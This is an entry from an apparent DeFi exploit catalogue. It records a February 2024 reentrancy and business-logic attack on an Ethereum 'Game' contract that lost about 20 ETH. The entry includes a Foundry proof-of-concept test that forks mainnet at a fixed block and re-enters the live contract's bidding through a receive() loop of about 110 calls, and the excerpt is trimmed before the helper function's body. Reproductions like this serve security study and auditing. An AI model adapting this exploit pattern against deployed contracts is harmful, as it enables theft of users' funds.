# [?] Game - Reentrancy && Business Logic Flaw

## Summary
Severity: Unknown
Chain: Ethereum
Component: Game
Published: 2024-02-11
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/Game_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~20 ETH
References:
- https://twitter.com/AnciliaInc/status/1757533144033739116

```solidity
contract ContractTest is Test {
    IGame private constant Game = IGame(0x52d69c67536f55EfEfe02941868e5e762538dBD6);
    uint8 private reentrancyCalls;

    function setUp() public {
        vm.createSelectFork("mainnet", 19_213_946);
        vm.label(address(Game), "Game");
    }

    function testExploit() public {
        // Start with 0.6 Ether balance
        deal(address(this), 0.6 ether);
        emit log_named_decimal_uint("Exploiter ETH balance before attack", address(this).balance, 18);

        // Following amount will be returned multiple times in receive() function when exploiter make the bad bid
        uint256 bid = (address(this).balance * 49) / 100;
        Game.makeBid{value: bid}();

        makeBadBid();

        emit log_named_decimal_uint("Exploiter ETH balance after attack", address(this).balance, 18);
    }

    receive() external payable {
        if (reentrancyCalls <= 109) {
            ++reentrancyCalls;
            makeBadBid();
        } else {
            return;
        }
    }

    function makeBadBid() internal {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/Game_exp.sol_
